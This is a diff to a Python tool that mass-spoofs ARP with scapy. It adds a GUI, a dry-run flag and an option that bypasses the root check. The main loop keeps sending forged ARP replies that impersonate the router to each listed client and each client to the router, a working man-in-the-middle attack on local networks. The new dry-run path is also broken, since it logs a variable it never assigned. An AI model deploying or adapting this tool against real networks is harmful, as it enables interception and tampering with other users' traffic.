@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 
-"""Easy multiple arp spooferinator"""
+"""Easy multiple arp spooferinator. See LICENSE.txt for copyright"""
 
-import argparse
 import ctypes
 from gooey import Gooey
+from gooey import GooeyParser
 import logging
 import os
 from signal import SIGINT, signal
@@ -51,28 +51,39 @@ def read_config(filename):
     return output
 
 
-def send_packets(router_ip, client_ip, router_mac, client_mac):
+def send_packets(router_ip, client_ip, router_mac, client_mac, dry):
     """Sends ARP packets to router and client"""
-    arpspoofed = ARP(op=2, psrc=router_ip, pdst=client_ip, hwdst=router_mac)
+    if not dry:
+        arpspoofed = ARP(op=2, psrc=router_ip, pdst=client_ip, hwdst=router_mac)
+        send(arpspoofed)
     logging.debug(arpspoofed)
-    send(arpspoofed)
-    arpspoofed = ARP(op=2, psrc=client_ip, pdst=router_ip, hwdst=client_mac)
+    if not dry:
+        arpspoofed = ARP(op=2, psrc=client_ip, pdst=router_ip, hwdst=client_mac)
+        send(arpspoofed)
     logging.debug(arpspoofed)
-    send(arpspoofed)
 
 
 @Gooey
 def main():
     """Main function"""
-    if not is_admin():
-        logging.critical("This program needs to be run as administrator for raw socket privileges")
-        print("This program needs to be run as administrator for raw socket privileges")
-        sys.exit(1)
 
-    parser = argparse.ArgumentParser()
+    parser = GooeyParser()
     parser.add_argument(
         "config_file",
-        help="config file with format \"IP MAC\" without quotes and with the router on line one"
+        help="config file with format \"IP MAC\" without quotes and with the router on line one",
+        widget="FileChooser"
+    )
+    parser.add_argument(
+        "--dry",
+        help="dry run (don't send packets)",
+        action="store_true",
+        widget="BlockCheckbox"
+    )
+    parser.add_argument(
+        "--assume-root",
+        help="ignore the \"we\'re not running as root\" warning",
+        action="store_true",
+        widget="BlockCheckbox"
     )
     parser.add_argument(
         "--verbose", "-v",
@@ -81,6 +92,10 @@ def main():
         default=0
     )
     args = parser.parse_args()
+    if not args.assume_root and not is_admin():
+        logging.critical("This program needs to be run as administrator for raw socket privileges")
+        print("This program needs to be run as administrator for raw socket privileges")
+        sys.exit(1)
     numeric_level = min(args.verbose * 10, 50)
     if not isinstance(numeric_level, int):
         raise ValueError('Invalid log level')
@@ -90,7 +105,7 @@ def main():
     # The important part.
     while True:
         for i in range(1, len(config)):
-            send_packets(config[0][0], config[i][0], config[0][1], config[i][1])
+            send_packets(config[0][0], config[i][0], config[0][1], config[i][1], args.dry)
 
 
 if __name__ == '__main__':
